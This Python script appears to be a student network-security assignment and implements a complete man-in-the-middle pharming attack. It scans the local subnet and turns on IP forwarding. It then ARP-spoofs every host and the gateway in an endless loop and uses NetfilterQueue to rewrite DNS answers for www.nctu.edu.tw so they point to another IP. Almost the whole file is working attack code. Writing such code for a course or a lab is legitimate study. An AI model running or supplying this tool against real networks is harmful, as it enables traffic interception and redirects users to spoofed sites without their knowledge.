#!/usr/bin/env python
from scapy.all import *                     # including all the functions we need in this project, e.g., sniff, get the IP's, arp spoofing
from netfilterqueue import NetfilterQueue   # for putting the packet into queue than modified it
import os                                   # for enabling IP forwarding and building up the queue, Python standard library 
import threading                            # for parallelly executing sniff() which is included in Scapy package, Python standard library

# Scan all devices in the subnet
def scan(ip):
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    answer = srp(pkt, verbose=0, timeout=1)[0]
    result = []
    # parsing the scan result and save the IP and MAC address to dictionary
    for index in answer:
        result_dict = {"ip": index[1].psrc, "mac": index[1].hwsrc}
        result.append(result_dict)
    return result

# print out the list of devices
def printout(result):
    gatewayIP=conf.route.route("0.0.0.0")[2]
    print("Available devices")
    print("----------------------------------------------------")
    print("IP\t\t\tMAC Address")
    print("----------------------------------------------------")
    for index in result:
        if index["ip"] != gatewayIP:
            print(index["ip"] + "\t\t" + index["mac"])

# Modifying the DNSRR packet
def pharming(pkt):
    # Change the queued packet to scapy packet payload
    data=IP(pkt.get_payload())
    # If the packet is really the DNS query response packet
    if data.haslayer(DNSRR):
        # If the query website is the target website
        if "www.nctu.edu.tw." in data[DNSQR].qname:
            # Change the query IP to target server IP
            ans=DNSRR(rrname=data[DNSQR].qname, rdata="140.113.207.246")
            data[DNS].an=ans    # Save the modified IP into Scapy packet
            data[DNS].ancount=1 # Query answer count = 1

            # Delete the check field from IP and UDP header (DNS query use UDP)
            del data[IP].len
            del data[IP].chksum
            del data[UDP].len
            del data[UDP].chksum

            pkt.set_payload(bytes(data))    #Turn the modified scapy packet payload back to original packet type
    # Accept the packet
    pkt.accept()

# Sniff() starter
def startPharming():
    # Build up the queue number 0
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")
    print("Start pharming...")
    # Modify the DNS response packet by "pharming" function
    queue=NetfilterQueue()
    try:
        # Bind the queue number 0 with "pharming" function
        queue.bind(0,pharming)
        # Start queuing the packets
        queue.run()
    except KeyboardInterrupt:
        # Flush the queue number 0
        os.system("iptables --flush")

# Execute ARP Spoofing
def ARPSPoofing(IP_1,IP_2,MAC_1):
    pkt = Ether(dst=MAC_1) / ARP(psrc=IP_2, pdst=IP_1, hwdst=MAC_1)
    srp(pkt, verbose=0, timeout=1)

# main function
def main():
    # Enable IP forwarding
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    # Task I: Scan the subnet
    attackerIP=get_if_addr(conf.iface)
    subnet=attackerIP+"/24"
    result = scan(subnet)
    printout(result)

    # Task III: Pharming attack and send the ARP response

    # Run sniff() in another thread
    pharm=threading.Thread(target=startPharming)
    pharm.setDaemon(True)
    pharm.start()

    # Get gateway IP and MAC
    gatewayIP=conf.route.route("0.0.0.0")[2]
    for index in result:
        if index["ip"] == gatewayIP:
            gatewayMAC=index["mac"]
    # Do ARP Spoofing to all the devices in the subnet
    while True:
        for index in result:
            if index["ip"] != gatewayIP:
                victimIP=index["ip"]
                victimMAC=index["mac"]
                ARPSPoofing(victimIP,gatewayIP,victimMAC)   # send spoofed-ARP packet to device
                ARPSPoofing(gatewayIP,victimIP,gatewayMAC)  # send spoofed-ARP packet to gateway

if __name__=="__main__":
    main()